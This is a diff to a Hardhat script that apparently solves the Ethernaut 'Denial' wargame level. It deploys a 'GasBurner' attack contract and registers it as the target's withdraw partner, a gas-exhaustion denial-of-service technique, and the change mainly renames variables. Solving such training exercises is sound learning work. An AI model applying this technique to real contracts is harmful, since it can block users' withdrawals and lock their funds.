@@ -17,11 +17,9 @@ const attackDenial = async () => {
     // const deployed = await deployContract(hre, "GasBurner", args);
     // alternative below
     console.log("Deploying attack contract GasBurner...");
-    const Factory = await ethers.getContractFactory("GasBurner", deployer);
-    const gasBurner = await Factory.deploy();
-    console.log(gasBurner);
-    console.log(`Contract deployed to ${gasBurner.address}`);
-    console.log("Attack contract deployed...");
+    const attack = await (await ethers.getContractFactory("GasBurner", deployer)).deploy();
+    console.log(attack);
+    console.log(`Attack contract deployed to ${attack.address}`);
     // experimantal verify below
     // if (gasBurner.address){
     //     console.log("Verifying contract...");
@@ -62,12 +60,12 @@ const attackDenial = async () => {
     let partner = await contract.partner();
     console.log(`Partner is: ${partner}`);
     console.log("Now setting gasburner as withdraw partner");
-    const tx1 = await contract.setWithdrawPartner(gasBurner.address);
+    const tx1 = await contract.setWithdrawPartner(attack.address);
     console.log(tx1);
     console.log("Checking new partner");
     partner = await contract.partner();
     console.log(`Partner is: ${partner}`);
-    if (partner === gasBurner.address) {
+    if (partner === attack.address) {
         console.log("Partner is now gasburner...you may submit on ethernaut");
     } else {
         console.log("Please review code above and try agan...");
